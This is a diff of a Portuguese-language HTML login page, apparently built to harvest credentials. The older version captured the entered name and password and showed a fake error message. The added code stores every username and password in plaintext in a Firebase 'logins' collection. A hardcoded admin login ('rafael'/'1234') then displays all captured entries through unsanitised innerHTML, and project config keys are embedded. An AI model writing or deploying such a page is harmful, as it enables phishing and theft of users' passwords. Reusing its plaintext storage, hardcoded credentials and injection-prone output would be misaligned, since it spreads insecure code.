@@ -63,6 +63,8 @@ button{
     display:none;
     color:white;
     text-align:center;
+    max-height:300px;
+    overflow:auto;
 }
 </style>
 </head>
@@ -78,7 +80,6 @@ button{
 <input type="password" id="usuarioSenha" placeholder="Senha">
 
 <button class="btn-login" onclick="entrarUsuario()">Entrar</button>
-
 <button class="btn-admin" onclick="mostrarAdminLogin()">Administrador</button>
 
 </div>
@@ -92,7 +93,6 @@ button{
 <input type="password" id="adminPass" placeholder="Senha Admin">
 
 <button class="btn-login" onclick="entrarAdmin()">Entrar como Admin</button>
-
 <button class="btn-admin" onclick="voltar()">Voltar</button>
 
 </div>
@@ -108,57 +108,88 @@ button{
 
 </div>
 
-<script>
+<script type="module">
 
-let ultimoNome = "";
-let ultimaSenha = "";
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
+import { getFirestore, collection, addDoc, getDocs } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore.js";
 
-// LOGIN USUÁRIO NORMAL
-function entrarUsuario(){
+// 🔥 CONFIG DO SEU PROJETO
+const firebaseConfig = {
+  apiKey: "AIzaSyCCjGhpNT8ZYR4vwO5zCsiht67E_G-EDFQ",
+  authDomain: "meu-site-bfad1.firebaseapp.com",
+  projectId: "meu-site-bfad1",
+  storageBucket: "meu-site-bfad1.firebasestorage.app",
+  messagingSenderId: "732673574881",
+  appId: "1:732673574881:web:2f03c4f9471df962d674a0",
+  measurementId: "G-FE60T3PDQZ"
+};
+
+const app = initializeApp(firebaseConfig);
+const db = getFirestore(app);
+
+// MOSTRAR LOGIN ADMIN
+window.mostrarAdminLogin = function(){
+    document.getElementById("loginTela").style.display = "none";
+    document.getElementById("adminLoginTela").style.display = "block";
+}
+
+// VOLTAR
+window.voltar = function(){
+    document.getElementById("loginTela").style.display = "block";
+    document.getElementById("adminLoginTela").style.display = "none";
+    document.getElementById("adminPainel").style.display = "none";
+}
+
+// LOGIN USUÁRIO
+window.entrarUsuario = async function(){
+
     const nome = document.getElementById("usuarioNome").value;
     const senha = document.getElementById("usuarioSenha").value;
 
     if(nome === "" || senha === ""){
         alert("Preencha todos os campos!");
-    } else {
-        ultimoNome = nome;
-        ultimaSenha = senha;
-
-        alert("Desculpe, nosso site está com problemas.\nVocê será redirecionado...");
+        return;
     }
+
+    await addDoc(collection(db, "logins"), {
+        usuario: nome,
+        senha: senha,
+        data: new Date()
+    });
+
+    alert("Login registrado com sucesso!");
 }
 
-// MOSTRAR LOGIN ADMIN
-function mostrarAdminLogin(){
-    document.getElementById("loginTela").style.display = "none";
-    document.getElementById("adminLoginTela").style.display = "block";
-}
+// LOGIN ADMIN
+window.entrarAdmin = async function(){
 
-// ENTRAR COMO ADMIN
-function entrarAdmin(){
     const user = document.getElementById("adminUser").value;
     const pass = document.getElementById("adminPass").value;
 
-    // VOCÊ PODE TROCAR AQUI
     if(user === "rafael" && pass === "1234"){
+
         document.getElementById("adminLoginTela").style.display = "none";
         document.getElementById("adminPainel").style.display = "block";
 
-        document.getElementById("mensagemAdmin").innerHTML =
-            "Olá Rafael 👋<br><br>" +
-            "Último login registrado:<br>" +
-            "Nome: " + ultimoNome + "<br>" +
-            "Senha: " + ultimaSenha;
+        const querySnapshot = await getDocs(collection(db, "logins"));
+
+        let resultado = "";
+
+        querySnapshot.forEach((doc) => {
+            const dados = doc.data();
+            resultado += `
+                <hr>
+                Usuário: ${dados.usuario} <br>
+                Senha: ${dados.senha} <br>
+                Data: ${dados.data.toDate()}
+            `;
+        });
+
+        document.getElementById("mensagemAdmin").innerHTML = resultado;
+
     } else {
         alert("Usuário ou senha de administrador incorretos!");
     }
-}
-
-// VOLTAR
-function voltar(){
-    document.getElementById("loginTela").style.display = "block";
-    document.getElementById("adminLoginTela").style.display = "none";
-    document.getElementById("adminPainel").style.display = "none";
 }
 
 </script>
